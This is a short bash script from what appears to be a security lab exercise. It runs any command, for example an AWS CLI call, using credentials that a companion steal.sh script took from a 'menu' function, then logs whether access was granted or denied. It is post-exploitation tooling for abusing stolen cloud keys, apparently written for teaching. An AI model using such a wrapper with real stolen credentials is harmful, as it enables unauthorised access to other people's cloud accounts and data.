#!/bin/bash
# Lab 8, Part 3: runs one command with the keys that steal.sh stole,
# as if you were the menu function. For example:
#   ./as-menu.sh aws s3 ls
. "$(dirname "$0")/names.sh"
if [ ! -s "$HERE/stolen-keys.txt" ]; then
  echo "No stolen keys yet. Run ./steal.sh first."
  exit 1
fi
OUT=$(env $(cat "$HERE/stolen-keys.txt") "$@" 2>&1)
CODE=$?
echo "$OUT"
if echo "$OUT" | grep -q -E 'AccessDenied|not authorized'; then
  RESULT=denied
elif [ $CODE = 0 ]; then
  RESULT=ok
else
  RESULT=error
fi
echo "$(date -u +%FT%TZ) as-menu $RESULT $*" >> "$LOG"
